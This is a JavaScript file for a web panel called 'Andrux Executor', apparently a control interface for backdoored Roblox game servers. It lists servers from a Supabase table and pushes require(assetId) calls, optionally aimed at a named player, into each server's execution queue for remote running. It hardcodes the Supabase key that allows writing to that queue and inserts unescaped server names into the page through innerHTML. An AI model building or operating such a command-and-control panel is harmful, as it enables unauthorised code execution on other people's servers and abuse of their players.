/* Andrux Executor — Lua/Require mode toggle + require(assetId) push */
(function(){
'use strict';

var SU='https://nyourvnfzhxbofwmavgq.supabase.co';
var SK='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im55b3Vydm5memh4Ym9md21hdmdxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwOTYwMTIsImV4cCI6MjEwMDY3MjAxMn0.YqztdjSz8kDAf9sHpqVeiMLjfwSbl4kvc8O5sGyJkvg';
var TABLE='ax_gs';
var BINDINGS_TABLE='ax_rb';
var HDRS={apikey:SK,Authorization:'Bearer '+SK,'Content-Type':'application/json'};

function $(id){return document.getElementById(id);}

function toast(msg){
var el=$('toast');if(!el)return;
el.textContent=msg;el.classList.add('show');
clearTimeout(toast._t);
toast._t=setTimeout(function(){el.classList.remove('show');},2000);
}

function apiGet(path){
return fetch(SU+'/rest/v1/'+path,{headers:HDRS}).then(function(r){return r.json();});
}

function apiPatch(path,body){
return fetch(SU+'/rest/v1/'+path,{
method:'PATCH',
headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
body:JSON.stringify(body)
}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r;});
}

function hideOffline(){
  try{return localStorage.getItem('andrux_hide_offline')==='1';}catch(e){return false;}
}

function loadGames(){
var sel=$('execRequireGame');
if(!sel)return;
apiGet(TABLE+'?select=place_id,game_name,player_count,status&hidden=eq.false&order=game_name.asc')
.then(function(rows){
if(!rows||!rows.length){sel.innerHTML='<option value="">没有服务器</option>';return;}
var hideOff=hideOffline();
var filtered=rows.filter(function(r){
  if(hideOff&&r.status!=='online')return false;
  return true;
});
if(!filtered.length){
  sel.innerHTML='<option value="">'+(hideOff?'没有在线服务器':'没有服务器')+'</option>';
  return;
}
sel.innerHTML=filtered.map(function(r){
var name=r.game_name||r.place_id;
var pc=(r.status==='online')?(r.player_count||0):0;
var statusTag=(r.status==='online')?'':' [离线]';
return'<option value="'+r.place_id+'"'+(r.status==='online'?'':' data-offline="1"')+'>'+name+statusTag+' ('+pc+')</option>';
}).join('');
})
.catch(function(){sel.innerHTML='<option value="">加载失败</option>';});
}

function parseAsset(input){
input=(input||'').trim();
var m=input.match(/^(\d+)([\.:]?[A-Za-z_]\w*)?$/);
if(!m)return null;
return{asset_id:m[1],suffix:m[2]||''};
}

function pushRequire(){
var sel=$('execRequireGame');
var inp=$('execRequireInput');
var usr=$('execRequireUser');
var st=$('execRequireStatus');
var btn=$('execRequireSendBtn');
if(!sel||!inp)return;

var placeId=sel.value;
if(!placeId){toast('请选择目标服务器');return;}

var parsed=parseAsset(inp.value);
if(!parsed){toast('资产 ID 格式错误，应为纯数字或 12345.func / 12345:method');return;}

var username=(usr?usr.value:'').trim();

var entry={type:'asset',asset_id:parsed.asset_id,suffix:parsed.suffix,username:username};

btn.disabled=true;btn.textContent='推送中...';
if(st)st.textContent='正在推送到服务器...';

apiGet(TABLE+'?select=exec_queue&place_id=eq.'+placeId)
.then(function(rows){
var queue=[];
if(rows&&rows[0]&&Array.isArray(rows[0].exec_queue)){
queue=rows[0].exec_queue;
}
queue.push(entry);
return apiPatch(TABLE+'?place_id=eq.'+placeId,{exec_queue:queue});
})
.then(function(){
toast('已推送: require('+parsed.asset_id+')'+parsed.suffix+'("'+username+'")');
if(st)st.textContent='已推送 require('+parsed.asset_id+')'+parsed.suffix+'("'+username+'")';
inp.value='';
})
.catch(function(err){
toast('推送失败:'+(err.message||err));
if(st)st.textContent='推送失败';
})
.then(function(){
btn.disabled=false;btn.textContent='推送执行';
});
}

function setupModeToggle(){
var btns=document.querySelectorAll('.exec-mode-btn');
if(!btns.length)return;
btns.forEach(function(btn){
btn.onclick=function(){
var mode=btn.getAttribute('data-mode');
btns.forEach(function(b){
b.classList.remove('active');
b.style.background='var(--surface)';
b.style.color='var(--muted)';
});
btn.classList.add('active');
btn.style.background='var(--accent)';
btn.style.color='#fff';
var lua=$('execLuaPanel');
var req=$('execRequirePanel');
if(lua)lua.style.display=mode==='lua'?'':'none';
if(req)req.style.display=mode==='require'?'':'none';
};
});
}

var _execInterval=false;
function init(){
var btn=$('execRequireSendBtn');
if(!btn)return;

btn.onclick=pushRequire;

var clr=$('execRequireClearBtn');
if(clr)clr.onclick=function(){
var i=$('execRequireInput'),u=$('execRequireUser'),s=$('execRequireStatus');
if(i)i.value='';
if(u)u.value='';
if(s)s.textContent='已清空';
};

var ref=$('execRequireRefreshBtn');
if(ref)ref.onclick=function(){loadGames();toast('已刷新服务器列表');};

setupModeToggle();

if(!_execInterval){
_execInterval=true;
loadGames();
setInterval(loadGames,30000);
}
}

if(document.readyState==='loading'){
document.addEventListener('DOMContentLoaded',init);
}else{init();}
setTimeout(init,1000);
setTimeout(init,3000);

var _obs=new MutationObserver(function(){
setTimeout(init,100);
});
_obs.observe(document.body,{childList:true,subtree:true});

/* Refresh game list when hide-offline setting changes */
window.addEventListener('storage',function(e){
  if(e.key==='andrux_hide_offline'){loadGames();}
});
window.addEventListener('andrux_hide_offline_change',function(){loadGames();});

window.AxExecAsset={reload:loadGames};
})();
